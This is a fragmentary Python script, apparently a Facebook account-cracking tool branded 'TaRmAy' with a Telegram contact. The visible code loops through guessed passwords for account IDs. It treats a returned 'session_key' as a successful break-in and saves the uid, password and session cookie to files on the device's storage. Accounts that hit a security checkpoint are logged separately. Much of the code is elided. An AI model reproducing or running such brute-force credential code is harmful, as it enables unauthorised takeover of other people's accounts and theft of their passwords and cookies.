...
\033[1;97m--------------------------------------------------
\033[1;91m Author      : TaRmAy☠
\033[1;91m Telegram    : https://t.me/xallo_husen454
\033[1;91m Status      : VIP TOOL🧟☠
\033[1;97m--------------------------------------------------
'''
loop = 0
oks = []
...
def afg_randome():
	...
	print('[?] Total Ok Id Save in  /sdcard/TaRmAy🤪👹-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/TaRmAy🧟🤮-CP.txt')
	print(47*'-')
...
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [TaRmAy☠😈-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in mking_pass:
			...
			if 'session_key' in po:
				...
				open('/sdcard/TaRmAy🤪👹-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [TaRmAy🧟🤮-CP] '+str(uid)+' | '+pas+'\033[1;97m')
